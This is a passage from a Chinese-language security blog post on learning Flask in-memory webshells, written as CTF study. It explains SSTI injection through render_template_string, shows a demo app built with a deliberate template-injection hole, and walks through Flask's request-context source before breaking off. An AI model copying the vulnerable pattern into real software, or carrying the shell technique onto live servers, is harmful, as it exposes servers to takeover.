
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>Flask内存马学习 - hybcx's blog</title>

  
    <meta name="description" content="0x01 前言 学习的动机是H&amp;NCTF2024的flask内存马，之前也没接触过，还有就是长城杯线下半决赛，当时也是记得，比赛刚开始，就被佬的队伍上了内存马，导致自己的服务器都一直上不去。。。。 本文估计很多cv的，但肯定都会思考实操一遍，努力产出自己的思考和语言！ 0x02 原理 常用的Python框架有Django、Flask, 这两者都可能存在SSTI漏洞. Python 内存马利">
<meta property="og:type" content="article">
<meta property="og:title" content="Flask内存马学习">
<meta property="og:url" content="http://hybcx.xyz/2024/05/26/flask-nei-cun-ma-xue-xi/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 前言 学习的动机是H&amp;NCTF2024的flask内存马，之前也没接触过，还有就是长城杯线下半决赛，当时也是记得，比赛刚开始，就被佬的队伍上了内存马，导致自己的服务器都一直上不去。。。。 本文估计很多cv的，但肯定都会思考实操一遍，努力产出自己的思考和语言！ 0x02 原理 常用的Python框架有Django、Flask, 这两者都可能存在SSTI漏洞. Python 内存马利">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528115259072.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528115521959.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528115927710.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528120419861.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528120619035.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528120807548.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528133149806.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528142205320.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528143641328.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528144436595.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528144808586.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528144846381.png">
<meta property="article:published_time" content="2024-05-26T12:01:32.000Z">
<meta property="article:modified_time" content="2024-05-28T06:53:45.963Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="web知识总结">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="d:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528115259072.png">
  
  
  
  <meta name="keywords" content="web知识总结">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/06/01/ju-zhen-bei/"><span class="title">矩阵杯</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/29/bluecms-dai-ma-shen-ji/"><span class="title">BlueCMS代码审计</span></a><a class="item title" href="/2024/06/01/seacms-dai-ma-shen-ji/"><span class="title">SeaCMS代码审计</span></a><a class="item title" href="/2024/05/12/h-nctf2024/"><span class="title">H&NCTF2024</span></a><a class="item title" href="/2024/05/26/flask-nei-cun-ma-xue-xi/"><span class="title">Flask内存马学习</span></a><a class="item title" href="/2024/05/21/ciscn-2024wp/"><span class="title">CISCN-2024Wp</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">web知识总结</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-05-26T12:01:32.000Z">2024-05-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-05-28T06:53:45.963Z">2024-05-28</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>Flask内存马学习</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-前言">0x01 前言</h1>
<p>学习的动机是H&amp;NCTF2024的flask内存马，之前也没接触过，还有就是长城杯线下半决赛，当时也是记得，比赛刚开始，就被佬的队伍上了内存马，导致自己的服务器都一直上不去。。。。</p>
<p>本文估计很多cv的，但肯定都会思考实操一遍，努力产出自己的思考和语言！</p>
<h1 id="0x02-原理">0x02 原理</h1>
<p>常用的<code>Python</code>框架有<code>Django</code>、<code>Flask</code>, 这两者都可能存在<code>SSTI</code>漏洞. <code>Python 内存马</code>利用<code>Flask</code>框架中<code>SSTI</code>注入来实现, <code>Flask</code>框架中在<code>web</code>应用模板渲染的过程中用到<code>render_template_string</code>进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现<code>Python</code>内存马的注入。</p>
<h1 id="0x03-前置知识">0x03 前置知识</h1>
<h2 id="flask上下文管理机制">Flask上下文管理机制</h2>
<p>先说结论：</p>
<p>当网页请求进入<code>Flask</code>时, 会实例化一个<code>Request Context</code>。在<code>Python</code>中分出了两种上下文: 请求上下文(request context)、应用上下文(session context). 一个请求上下文中封装了请求的信息, 而上下文的结构是运用了一个<code>Stack</code>的栈结构, 也就是说它拥有一个栈所拥有的全部特性. <code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p>
<p>接下来写个简单demo</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string

app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():
    person = <span class="hljs-string">'guest'</span>
    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">'name'</span>):
        person = request.args.get(<span class="hljs-string">'name'</span>)
    template = <span class="hljs-string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> % person
    <span class="hljs-keyword">return</span> render_template_string(template)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run()</code></pre>
<p>在home函数里下个断点，开始调试，接收到页面传来的参数之后，当前栈结构如下，这里有的人说：</p>
<pre><code class="hljs scss">flask在接受到请求的时候会调用app的__call__方法</code></pre>
<p>但我也不清楚具体是如何就调用了，只能根据下图的栈结构分析，在<code>__call__</code>方法前，先是一些处理request请求的函数，接下来才是call，然后跟着文章走一下</p>
<p>tips：代码审计也没学过，只能照猫画虎了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528115259072.png" alt="image-20240528115259072"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528115521959.png" alt="image-20240528115521959"></p>
<p>继续跟进就来到了这里</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528115927710.png" alt="image-20240528115927710"></p>
<p>据文章说：这里self是当前Flask对象，然后调用request_context方法，得到一个RequestContext</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528120419861.png" alt="image-20240528120419861"></p>
<p>继续看一下ctx的具体内容，如下图可以看到包含了当前的request和session等</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528120619035.png" alt="image-20240528120619035"></p>
<p>继续跟进到了ctx调用了push</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528120807548.png" alt="image-20240528120807548"></p>
<p>主要就是尝试获取当前上下文，然后if语句判断，如果没有应用上下文，或者当前上下文的应用与请求的应用不同，则创建一个新的应用上下文，并将其推入上下文堆栈。</p>
<p>然后将当前请求上下文和可能的应用上下文作为一个元组，添加到 <code>_cv_tokens</code> 列表中。</p>
<p>下面的内容，我调试就找不到了，就直接看吧：上下文有关的内容定义在 <code>globals.py</code> 文件，文件的内容也非常短：</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_lookup_req_object</span>(<span class="hljs-params">name</span>):
    top = _request_ctx_stack.top
    <span class="hljs-keyword">if</span> top <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">raise</span> RuntimeError(_request_ctx_err_msg)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(top, name)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">_lookup_app_object</span>(<span class="hljs-params">name</span>):
    top = _app_ctx_stack.top
    <span class="hljs-keyword">if</span> top <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">raise</span> RuntimeError(_app_ctx_err_msg)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(top, name)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">_find_app</span>():
    top = _app_ctx_stack.top
    <span class="hljs-keyword">if</span> top <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">raise</span> RuntimeError(_app_ctx_err_msg)
    <span class="hljs-keyword">return</span> top.app


<span class="hljs-comment"># context locals</span>
_request_ctx_stack = LocalStack()
_app_ctx_stack = LocalStack()
current_app = LocalProxy(_find_app)
request = LocalProxy(partial(_lookup_req_object, <span class="hljs-string">'request'</span>))
session = LocalProxy(partial(_lookup_req_object, <span class="hljs-string">'session'</span>))
g = LocalProxy(partial(_lookup_app_object, <span class="hljs-string">'g'</span>))</code></pre>
<p>可以看到这里的_request_ctx_stack就是一个LocalStack对象</p>
<pre><code class="hljs scss">这里的实现用到了两个东西：LocalStack 和 LocalProxy。它们两个的结果就是我们可以动态地获取两个上下文的内容，在并发程序中每个视图函数都会看到属于自己的上下文，而不会出现混乱。</code></pre>
<p>_request_ctx_stack会将当前线程或者协程的请求都保存在栈里，等使用的时候再从里面读取。至于为什么要用到栈结构，而不是直接使用 <code>Local</code></p>
<p>对于这段代码</p>
<pre><code class="hljs scss">_request_ctx_stack = <span class="hljs-built_in">LocalStack</span>()
request = <span class="hljs-built_in">LocalProxy</span>(partial(_lookup_req_object, 'request'))
session = <span class="hljs-built_in">LocalProxy</span>(partial(_lookup_req_object, 'session'))</code></pre>
<p><code>_request_ctx_stack</code>是多线程或者协程隔离的栈结构，<code>request</code> 每次都会调用 <code>_lookup_req_object</code> 栈头部的数据来获取保存在里面的 <code>requst context</code></p>
<p>看一下RequestContext具体内容</p>
<pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestContext</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-string">"""The request context contains all request relevant information.  It is</span>
<span class="hljs-string">    created at the beginning of the request and pushed to the</span>
<span class="hljs-string">    `_request_ctx_stack` and removed at the end of it.  It will create the</span>
<span class="hljs-string">    URL adapter and request object for the WSGI environment provided.</span>
<span class="hljs-string">    """</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, app, environ, request=<span class="hljs-literal">None</span></span>):
        self.app = app
        <span class="hljs-keyword">if</span> request <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            request = app.request_class(environ)
        self.request = request
        self.url_adapter = app.create_url_adapter(self.request)
        self.match_request()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">match_request</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""Can be overridden by a subclass to hook into the matching</span>
<span class="hljs-string">        of the request.</span>
<span class="hljs-string">        """</span>
        <span class="hljs-keyword">try</span>:
            url_rule, self.request.view_args = \
                self.url_adapter.<span class="hljs-keyword">match</span>(return_rule=<span class="hljs-literal">True</span>)
            self.request.url_rule = url_rule
        <span class="hljs-keyword">except</span> HTTPException <span class="hljs-keyword">as</span> e:
            self.request.routing_exception = e

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">self</span>):
